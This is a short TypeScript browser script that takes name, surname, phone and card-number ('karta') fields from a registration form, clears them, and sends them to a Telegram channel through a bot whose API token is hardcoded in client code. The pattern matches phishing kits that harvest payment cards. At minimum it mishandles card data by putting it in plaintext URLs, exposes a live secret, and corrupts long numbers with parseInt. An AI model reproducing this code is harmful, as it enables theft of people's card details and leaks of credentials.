interface NewMessage {
    name:string,
    surname:string,
    phone:number,
    karta:number
}

let bot_token:string = '6166515420:AAGiRq_gOqwTkEDjPE2duAeJyfn3V5Nt2Ng';
let chanel_id:string = '-1001216868293';
async function sendMessage() {
    let NameValue = (<HTMLInputElement>document.getElementById('name')).value;
    let SurnameValue = (<HTMLInputElement>document.getElementById('surname')).value;
    let PhoneValue = (<HTMLInputElement>document.getElementById('phone')).value;
    let KartaValue = (<HTMLInputElement>document.getElementById('karta')).value;

    (<HTMLInputElement>document.getElementById('name')).value = "";
    (<HTMLInputElement>document.getElementById('surname')).value = "";
    (<HTMLInputElement>document.getElementById('phone')).value = "";
    (<HTMLInputElement>document.getElementById('karta')).value = "";

    let newMessage:NewMessage = {
        name:NameValue,
        surname:SurnameValue,
        phone:parseInt(PhoneValue),
        karta:parseInt(KartaValue)
    }
    let message:string =
        `Ro'yhatdan o'tdi:  
        %0A\nIsmi: ${newMessage.name},  
        %0A\nFamilya: ${newMessage.surname}, 
        %0A\nNomer: ${newMessage.phone},
        %0A\nKarta: ${newMessage.karta}`


    await fetch(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chanel_id}&text=${message}`)


}